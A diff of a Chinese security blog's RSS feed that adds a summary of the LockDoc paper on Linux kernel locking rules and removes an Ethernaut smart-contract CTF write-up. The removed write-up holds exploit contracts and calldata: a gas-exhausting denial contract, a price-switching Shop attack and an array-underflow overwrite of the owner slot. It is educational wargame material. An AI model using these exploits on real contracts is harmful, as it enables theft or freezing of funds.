@@ -5,8 +5,225 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Tue, 18 Feb 2020 13:41:03 +0800</lastBuildDate>
+    <lastBuildDate>Sat, 07 Mar 2020 17:31:58 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>EuroSys 2019 LockDoc</title>
+      <link>https://syang-ng.github.io/2020/03/eurosys-2019-lockdoc/</link>
+      <pubDate>Sat, 07 Mar 2020 17:31:58 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/03/eurosys-2019-lockdoc/</guid>
+      <description>
+
+&lt;h2 id=&#34;eurosys-2019-lockdoc-trace-based-analysis-of-locking-in-the-linux-kernel&#34;&gt;EuroSys - 2019 - LockDoc: Trace-Based Analysis of Locking in the Linux Kernel&lt;/h2&gt;
+
+&lt;h2 id=&#34;摘要&#34;&gt;摘要&lt;/h2&gt;
+
+&lt;p&gt;关注的问题：对 kernel 开发者来说，开发文档上关于锁的使用的介绍是不全面的，有时还会有出错的可能，最终会导致相关的 bug 出现。&lt;/p&gt;
+
+&lt;p&gt;Insight：一般而言，Linux 等操作系统绝大多数情况下处于正常运行状态，因此可以通过正常情况 Linux 内核的 trace 来推断什么是合理的加锁规则。&lt;/p&gt;
+
+&lt;p&gt;解决：通过在一个插桩的 Linux kernel 上记录对内核的数据结构和对锁的获取记录，分析并推断锁的合理规则。&lt;/p&gt;
+
+&lt;p&gt;效果：作者在实验中找到了 52,452 个违反加锁规则的例子，并由开发者确认了其中一个是真实存在的 bug。&lt;/p&gt;
+
+&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+
+&lt;h3 id=&#34;锁的使用&#34;&gt;锁的使用&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/Figure1.png&#34; alt=&#34;Figure 1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从上图可以看到，在 Linux kenerl 的版本号从 3.0 到 4.18 的 7 年时间里，Linux kernel 的总代码行数增长了约 73%，Spinlock 锁的使用增长了 45%，而 mutexes 锁的使用增长了约 81%，增长关系随着代码行数的增加保持着一定的线性关系。&lt;/p&gt;
+
+&lt;h3 id=&#34;复杂的使用场景&#34;&gt;复杂的使用场景&lt;/h3&gt;
+
+&lt;p&gt;Linux 中提供了多种加锁机制，根据当前或者潜在的上下文环境，比如用于一个 IRQ 的 handler，或者是 bottom half，开发者需要选择符合需求的锁，比如说 &lt;code&gt;spin_lock[_(bh|irq)]&lt;/code&gt;，&lt;code&gt;read_seqbegin&lt;/code&gt;，&lt;code&gt;write_seqlock[_(bh|irq)]&lt;/code&gt;， &lt;code&gt;mutex_lock&lt;/code&gt;，&lt;code&gt;down&lt;/code&gt;，&lt;code&gt;local_(bh|irq)_disable&lt;/code&gt; 还是&lt;code&gt;preempt_disable&lt;/code&gt;。此外，在符合需求的锁中，可能需要继续选择性能最好的一个，比如在不会条件竞争的情况下，序列锁 &lt;code&gt;read_seqbegin&lt;/code&gt; 、&lt;code&gt;write_seqlock&lt;/code&gt;  比 &lt;code&gt;spinlocks&lt;/code&gt; 的效率更好；而如果已知并发的控制流只会在一个 CPU 上运行的话 ，轻量级的加锁机制 &lt;code&gt;preempt_disable&lt;/code&gt;， &lt;code&gt;local_bh_disable&lt;/code&gt;，&lt;code&gt;local_irq_disable&lt;/code&gt; 更被推荐使用。&lt;/p&gt;
+
+&lt;h3 id=&#34;潜在的-bug&#34;&gt;潜在的 Bug&lt;/h3&gt;
+
+&lt;p&gt;对于并行来说，是否加锁一直是一个需要取舍的问题，如果采取谨慎小心的态度，那么所有相关的数据结构都需要加上锁，那么很容易就有性能上的问题；相反，如果采用一种非常宽松的策略，那么很有可能就会出现条件竞争相关的漏洞，并最终导致相关的 bug。&lt;/p&gt;
+
+&lt;p&gt;除此之外，锁的顺序也相当重要，否则很有可能导致活锁或者死锁的问题；另外，及时释放一个已获得的锁也是避免潜在 bug 的重要手段。由于 Linux 代码中经常出现的函数提早返回的情况，跟加锁相关的代码相比，锁的释放的相关代码更多。&lt;/p&gt;
+
+&lt;h3 id=&#34;关于锁的文档&#34;&gt;关于锁的文档&lt;/h3&gt;
+
+&lt;p&gt;那么 Linux 对相关的文档是否详尽呢？答案也是否定的。以 &lt;code&gt;struct inode&lt;/code&gt; 为例，在头文件 &lt;code&gt;include/linux/fs.h&lt;/code&gt; 中有仅有一处有价值的注释：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;spinlock_t i_lock ; /∗ i_blocks , i_bytes , maybe i_size ∗/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么换一个思路，从具体的实现文件 &lt;code&gt;fs/inode.c&lt;/code&gt; 来看，里面有如下注释：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;Inode locking rules:
+
+inode−&amp;gt;i_lock protects :
+  inode−&amp;gt;i_state , inode−&amp;gt;i_hash , __iget ()
+Inode LRU list locks protect :
+	inode−&amp;gt;i_sb−&amp;gt;s_inode_lru , inode−&amp;gt;i_lru
+[...]
+inode_hash_lock protects :
+	inode_hashtable , inode−&amp;gt;i_hash
+[...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但这里同样存在着极大的问题，比如 &lt;code&gt;inode−&amp;gt;i_hash&lt;/code&gt;，&lt;code&gt;inode−&amp;gt;i_lock&lt;/code&gt; 和 &lt;code&gt;inode_hash_lock&lt;/code&gt; 这两种规则都被建议来保护该数据结构，这很难不让阅读该注释的开发人员迷惑。&lt;/p&gt;
+
+&lt;p&gt;更有趣的是，开发人员甚至可能写出如下注释：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;We don’t actually know what locking is used at the lower level; but if it’s a filesystem that supports quotas, it will be using i_lock as in inode_add_bytes().&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;总而言之，对于一个对源代码陌生的新 Linux 开发人员来说，处理 Linux kernel 中成百上千种锁是一种非常困难的任务而且极大容易出错。&lt;/p&gt;
+
+&lt;h2 id=&#34;已有的研究&#34;&gt;已有的研究&lt;/h2&gt;
+
+&lt;p&gt;目前，对 linux kernel 已有的研究可以简单分为以下三种，即预先的静态分析，过程中的动态分析，以及对过程中产生的结果所做的事后分析，三者各自拥有不同的优缺点。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Ahead-of-Time Analysis&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;静态分析的缺点非常明显，比如别名指针的问题，或者是针对程序的控制流的状态判断问题。现有的静态分析工作一般针对的代码模式较为有限，解决的问题也较为不全面。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Runtime Analysis&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;运行时的动态分析不会遇到诸如别名指针等问题，但相应的，存在代码覆盖率之类的问题。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Ex-Post Analysis&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;由于 Ex-Post Analysis 依赖于 Runtime Analysis 生成的结果，因此在大多数情况下二者的优缺点是相似的，但相比 Runtime Analysis，研究人员能以任意方式来存储并分析应用的执行结果。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;但令人遗憾的是，现有的工作绝大部分仍在关注如何在源代码中发现 bug 或者是解决性能的瓶颈，而没有任何的工作来辅助开发者写出正确的代码，本工作即旨在弥补这一缺陷，利用基于 trace 的分析，架成一道连接文档和 Linux kernel 真实开发环境的一道桥梁。&lt;/p&gt;
+
+&lt;h2 id=&#34;假设与挑战&#34;&gt;假设与挑战&lt;/h2&gt;
+
+&lt;p&gt;假设有如下代码， 其中 &lt;code&gt;seconds&lt;/code&gt; 和 &lt;code&gt;minutes&lt;/code&gt; 是两个共享变量，分别被锁 &lt;code&gt;sec_lock&lt;/code&gt;  和 &lt;code&gt;min lock&lt;/code&gt; 保护。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;lock(&amp;amp;sec_lock); // transaction a − start
+seconds = seconds + 1;
+if (seconds == 60) {
+    lock(&amp;amp;min_lock); // transaction b − start
+    seconds = 0;
+    minutes = minutes + 1;
+    unlock(&amp;amp;min_lock); // transaction b − end
+}
+unlock(&amp;amp;sec_lock); // transaction a − end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在某次执行中，该代码执行了 1000 次，此外还有另外一条执行结果，一个错误地没有给 &lt;code&gt;minutes&lt;/code&gt; 加上   &lt;code&gt;min_lock&lt;/code&gt; 锁，那么统计对 &lt;code&gt;minutes&lt;/code&gt; 变量的访问情况，以及可能的加锁规则，得到结果如下图所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/Table2.png&#34; alt=&#34;Table 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中正确的结果满足无加锁、sec_lock、sec_lock-&amp;gt;min_lock、min_lock 这四种情况，所以会有 16 次符合要求的访问，而错误的加锁规则之满足无加锁以及 sec_lock 这两种情况，所以这两种加锁规则还需要额外加上一个错误路径带来的 1，具体的计算规则如下图所示：&lt;/p&gt;
+
+&lt;p&gt;无加锁：1000 // 60 + 1 = 17&lt;/p&gt;
+
+&lt;p&gt;sec_lock：1000 // 60 + 1 = 17&lt;/p&gt;
+
+&lt;p&gt;sec_lock -&amp;gt; min_lock：1000 // 60  = 16&lt;/p&gt;
+
+&lt;p&gt;min_lock：1000 // 60  = 16&lt;/p&gt;
+
+&lt;p&gt;min_lock -&amp;gt; sec_lock：0&lt;/p&gt;
+
+&lt;p&gt;那么，下一个问题，我们如何选择正确的可能？&lt;/p&gt;
+
+&lt;p&gt;为此，作者提出了“次优选择”的策略。首先选择一个合理的阈值 tac，在 sr 高于阈值 tac 的所有情况中，选择值 sr 最小的一个，如果有多种可能，选择其中加锁最多的一个。这种选择的理由在于，在假设高于阈值的选择都具有可能性的情况下，错误的加锁使用反而会给错误的选择贡献访问，所以错误的选择反而 sr 的值更高。同理，在可选情况较多时，全集更比子集具有合理性。&lt;/p&gt;
+
+&lt;h2 id=&#34;设计与实现&#34;&gt;设计与实现&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/overview.png&#34; alt=&#34;Overview&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;LockDoc 的整体工作流程如上图所示，具体来说可以分成三个阶段，下面简单介绍三个阶段的工作。&lt;/p&gt;
+
+&lt;h3 id=&#34;monitoring-tracing-phase&#34;&gt;monitoring/tracing phase&lt;/h3&gt;
+
+&lt;p&gt;通过在一个 VM 里运行插桩后的 Linux kernel，记录相关数据结构的分配以及锁的加锁以及释放，生成相应的 trace 并插入到数据库中。&lt;/p&gt;
+
+&lt;h3 id=&#34;locking-rule-derivation-phase&#34;&gt;locking-rule derivation phase&lt;/h3&gt;
+
+&lt;p&gt;利用上一阶段得到的数据，在这一阶段可以推断出所有的加锁规则的假设上的可能性，然后推断出合理的规则。&lt;/p&gt;
+
+&lt;h3 id=&#34;analysis-phase&#34;&gt;analysis phase&lt;/h3&gt;
+
+&lt;p&gt;这一阶段主要是利用前一阶段生成的结果，来主要完成以下三个工作：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;通过生成的加锁规则和官方文档提供的加锁规则进行对比，比较二者的合理性&lt;/li&gt;
+&lt;li&gt;利用生成的加锁规则，生成用户可读的文档&lt;/li&gt;
+&lt;li&gt;通过生成规则的和记录的内存访问，验证代码中是否存在违背加锁规则的现象&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;实验评估&#34;&gt;实验评估&lt;/h2&gt;
+
+&lt;h3 id=&#34;前置条件&#34;&gt;前置条件&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;vanilla Linux 4.10&lt;/li&gt;
+&lt;li&gt;lock：&lt;code&gt;spinlock_t&lt;/code&gt;， &lt;code&gt;rw_lock_t&lt;/code&gt;， &lt;code&gt;semaphore&lt;/code&gt;， &lt;code&gt;rw_semaphore&lt;/code&gt;， &lt;code&gt;mutex&lt;/code&gt;， &lt;code&gt;rcu&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Fail*-based experiment environment&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;测试代码的覆盖率：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/codecoverage.png&#34; alt=&#34;Code Coverage&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;locking-rule-checking&#34;&gt;Locking Rule Checking&lt;/h3&gt;
+
+&lt;p&gt;测试的 5 个数据结构主要来自 OCFS2 和 ext4 所使用的组件 JBD2，分别是 &lt;code&gt;inode&lt;/code&gt;、 &lt;code&gt;dentry&lt;/code&gt;、&lt;code&gt;journal_t&lt;/code&gt; 、&lt;code&gt;transaction_t&lt;/code&gt;、&lt;code&gt;journal_head&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;根据在源代码中的注释，可以抽象出 142  项规则（71 个对象的读/写），总的结果如下表所示（其中 Table 5 是 Table 4 中 inode 项的详细结果）：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/Table4.png&#34; alt=&#34;Table 4&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/Table5.png&#34; alt=&#34;Table 5&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中 &lt;code&gt;#No&lt;/code&gt; 表示没有触发到的代码，&lt;code&gt;#Ob&lt;/code&gt; 则是触发到的代码，后三者中&lt;code&gt;√&lt;/code&gt; 表示结果完全符合，  􏰊&lt;code&gt;~&lt;/code&gt;  表示执行结果和文档部分符合，&lt;code&gt;×&lt;/code&gt; 表示完全不符合。&lt;/p&gt;
+
+&lt;p&gt;从这里能推出的结论是，或者是 Linux kernel 的源代码，或者是相关的文档，二者之中必然有一个出错了。但由于这里没有一个可供参考的 Ground Truth，因此无法得出确切的结论。但可以看出的是，&lt;code&gt;transaction_t&lt;/code&gt; 的文档质量相对较好，因为他和实际执行结果的匹配程度最高。&lt;/p&gt;
+
+&lt;h3 id=&#34;locking-rule-mining&#34;&gt;Locking Rule Mining&lt;/h3&gt;
+
+&lt;p&gt;本节主要讨论了 tac 和 sr 相关的合理性，比如不同的阈值 tac 会带来不同的结果，比如 tac 更低的时候，由于次优选择的策略，可能会选择不同的结果。&lt;/p&gt;
+
+&lt;p&gt;关于实际 sr 可能更低的情况，作者给了以下几个猜想：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;由于代码的覆盖率问题，无法触发代码可能会导致 sa = 0&lt;/li&gt;
+&lt;li&gt;插桩的不完整或者是其他工作上的疏忽，导致了 sr 较低&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;然后作者给出了利用推断出的规则可以生成的文档的例子：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/EuroSys-2019-LockDoc/Figure8.png&#34; alt=&#34;Figure 8&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;locking-rule-violations&#34;&gt;Locking Rule Violations&lt;/h3&gt;
+
+&lt;p&gt;作者在实验中最终找到了 52,452 个违反规则的内存访问的例子，但这同样由于没有 Ground Truth 而无法进行验证，但其中有一个被开发人员证实为 bug。&lt;/p&gt;
+
+&lt;p&gt;关于 FP，作者总结了以下几点原因：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Linux kernel 的代码中，可能会因为性能的原因，主动选择不使用某些锁&lt;/li&gt;
+&lt;li&gt;或者相似的情况，当开发者知道某些情况下不会出现并发访问的时候，会主动忽略锁的使用&lt;/li&gt;
+&lt;li&gt;上述问题引起的噪音加上次优选择的策略，可能推断出错误的加锁规则，同样会引起 FP&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;总结与未来展望&#34;&gt;总结与未来展望&lt;/h2&gt;
+
+&lt;p&gt;开发 kernel 的艰巨性决定了一个详尽的文档的必要性，而文档往往是不详细的残酷现实又给了该问题致命一击。那么如何得到一个详尽而且正确的文档呢？作者巧妙地基于一个假设：一般情况下 Linux 等操作系统是正常运行的，正常运行的系统很大概率正常地使用着锁。因此，我们能从一个系统的执行流程中推断出什么样的使用才是合理的。&lt;/p&gt;
+
+&lt;p&gt;当然，这种假设不仅仅适用于 Linux kernel，也推广到其他大型应用的开发过程中，辅助相关问题的解决。&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>理解 Android 中的 Dex 结构</title>
@@ -4793,147 +5010,6 @@ for i in indexes:
 &lt;li&gt;&lt;a href=&#34;https://gist.github.com/0xcpu/bad0b86f2a52b65ce4af06008d58a4c7&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Elementary Writeup by One Man Orchestra&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/13923&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Elementary Writeup by System87&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Ethernaut 部分题解</title>
-      <link>https://syang-ng.github.io/2019/05/ethernaut-part-writeup/</link>
-      <pubDate>Mon, 27 May 2019 13:42:59 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2019/05/ethernaut-part-writeup/</guid>
-      <description>
-
-&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;久违地想做智能合约的题目了，正好 Ethernaut 上还有几题没做的，就特地在博客里码一下~~&lt;/p&gt;
-
-&lt;h2 id=&#34;magicnumber&#34;&gt;MagicNumber&lt;/h2&gt;
-
-&lt;p&gt;手动构造智能合约，具体参考了 &lt;a href=&#34;https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;这里需要明确的知识点如下：&lt;/p&gt;
-
-&lt;h3 id=&#34;合约-bytcode&#34;&gt;合约 bytcode&lt;/h3&gt;
-
-&lt;p&gt;简单说，合约 bytecode 可以分为如下三个部分：部署代码、合约代码、以及用于验证的 Auxdata，在合约创建时运行的是部署代码，在合约创建成功后，运行的是合约代码。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;// 部署代码
-60606040523415600e57600080fd5b5b603680601c6000396000f300
-// 合约代码
-60606040525b600080fd00
-// Auxdata
-a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;本题的限制是，合约代码长度不能超过 10，而且函数必须返回 42，这就需要我们手动构造合约 bytecode。&lt;/p&gt;
-
-&lt;p&gt;合约代码部分构造如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;602a    // v: push1 0x2a (value is 42)
-6080    // p: push1 0x80 (memory slot is 0x80)
-52      // mstore
-6020    // s: push1 0x20 (value is 32 bytes in size)
-6080    // p: push1 0x80 (value was stored in slot 0x80)
-f3      // return
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;部署代码构建如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;600a    // s: push1 0x0a (10 bytes)
-600c    // f: push1 0x0c (current position of runtime opcodes)
-6000    // t: push1 0x00 (destination memory index 0)
-39      // CODECOPY
-600a    // s: push1 0x0a (runtime opcode length)
-6000    // p: push1 0x00 (access memory index 0)
-f3      // return to EVM
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最终合约创建构造如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from web3 import Web3
-
-my_ipc = Web3.HTTPProvider(&amp;quot;https://ropsten.infura.io/v3/xxxxxxxxxxxxxxxxxxx&amp;quot;)
-assert my_ipc.isConnected()
-w3 = Web3(my_ipc)
-
-myaddress = &amp;quot;&amp;quot;
-myprivkey = &amp;quot;&amp;quot;
-
-def makeTransaction(args):
-    obj = {
-        &#39;gasPrice&#39;: Web3.toWei(1, &#39;gwei&#39;),
-        &#39;gas&#39;:300000,
-        &#39;value&#39;: int(0)
-    }
-    return {**obj, **args}
-
-def getNonce(address):
-    return w3.eth.getTransactionCount(Web3.toChecksumAddress(address))
-
-def main():
-    txns = makeTransaction({&#39;code&#39;: &#39;0x600a600c600039600a6000f3602a60805260206080f3&#39;, &#39;nonce&#39;: getNonce(myaddress)})
-    signedTransaction = w3.eth.account.signTransaction(txns, myprivkey)
-    w3.eth.sendRawTransaction(signedTransaction.rawTransaction)
-
-if __name__ == &amp;quot;__main__&amp;quot;:
-    main()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;alien-codex&#34;&gt;Alien Codex&lt;/h2&gt;
-
-&lt;p&gt;两个 trick，首先是 bypass 数组长度的限制：&lt;code&gt;assert(_firstContactMessage.length &amp;gt; 2**200);&lt;/code&gt;，其次是通过数组的越界写，对 owner 变量进行修改。&lt;/p&gt;
-
-&lt;p&gt;通过阅读 &lt;a href=&#34;https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html，可以发现参数的数组，其长度其实是在&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html，可以发现参数的数组，其长度其实是在&lt;/a&gt; transaction 中的 data 决定的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;0x1d3d4c0b                                                       // function signature
-0000000000000000000000000000000000000000000000000000000000000020 // offset
-1000000000000000000000000000000000000000000000000000000000000001 // length
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;第二个考点是数组的越界写，类似 capturetheether 上的 mapping，我们需要控制向 codex 写的方式覆盖 owner 变量。首先第一步是调用 &lt;code&gt;retract()&lt;/code&gt; 函数让数组长度下溢。第二步时计算 owner 变量在数组中的位置，具体计算规则为 &lt;code&gt;2**256 - sha3(bytes(1))&lt;/code&gt;，得到 owner 对应 solt 0 的索引是 35707666377435648211887908874984608119992236509074197713628505308453184860938，调用 &lt;code&gt;revise&lt;/code&gt; 即可得到结果。&lt;/p&gt;
-
-&lt;h2 id=&#34;denail&#34;&gt;Denail&lt;/h2&gt;
-
-&lt;p&gt;题目的意思是禁止 owner 分走相应的余额，所以要求执行失败，本题的考点就是 Denail of Service.&lt;/p&gt;
-
-&lt;p&gt;很明显可以利用 assert 会消耗所有 gas 的特性来达成该条件（当然也可以考虑重入攻击）。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;contract DenialAttack {   
-    function() payable {
-        assert(0 == 1);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;shop&#34;&gt;Shop&lt;/h2&gt;
-
-&lt;p&gt;对 gas 的消耗有限制，所以不能通过 storage 变量的方式进行判断，但恰好 &lt;code&gt;isSold&lt;/code&gt; 恰好可以代替用于判断的 storage 变量，所以构造 payload 如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;contract Attack is Buyer {
-    Shop public i;
-    
-    constructor(address _addr) public {
-        i = Shop(_addr);
-    }
-    
-    function price() view returns(uint) {
-        return i.isSold() ? 0 : 100;
-    }
-    
-    function hack() {
-        i.buy();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;
-
-&lt;p&gt;之前把前几题的解答投到先知上了 &lt;a href=&#34;https://xz.aliyun.com/t/2856&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;从 Ethernaut 看以太坊智能合约漏洞（一）&lt;/a&gt;，剩下的可以参考 &lt;a href=&#34;http://www.bendawang.site/2018/11/13/Zeppelin-ethernaut-writeup/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Zeppelin ethernaut writeup&lt;/a&gt; 或者 &lt;a href=&#34;http://mitah.cn/index.php/archives/14/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Zeppelin Ethernaut writeup&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
-
-&lt;p&gt;拖了半年才做完这些题目，好生颓废。&lt;/p&gt;
 </description>
     </item>
     
